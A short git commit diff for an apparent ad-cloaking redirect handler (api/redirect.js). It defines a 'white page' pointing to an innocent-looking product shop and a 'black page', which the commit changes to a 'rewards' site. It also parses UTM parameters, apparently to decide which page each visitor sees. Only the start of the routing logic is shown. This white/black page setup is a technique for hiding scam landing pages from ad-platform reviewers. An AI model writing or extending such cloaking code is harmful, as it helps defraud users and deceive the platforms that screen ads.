5aff6bd16a461bc189a840572123a57978187034
Ayden Xu <aydenxunc@gmail.com>
2025-03-23 14:04:35 -0400

    fdsis

--- api/redirect.js
+++ api/redirect.js
@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
     const whitePageURL = "https://www.gagebeasleyshop.com/products/stegosaurus-rbg";
-    const blackPageURL = "https://SiImUqRhJu.myfunnelish.com/shwards";
+    const blackPageURL = "https://www.rwrds.live/";
   
     // Parse the UTM parameters from the request URL
     const queryParams = new URLSearchParams(req.url.split('?')[1]);
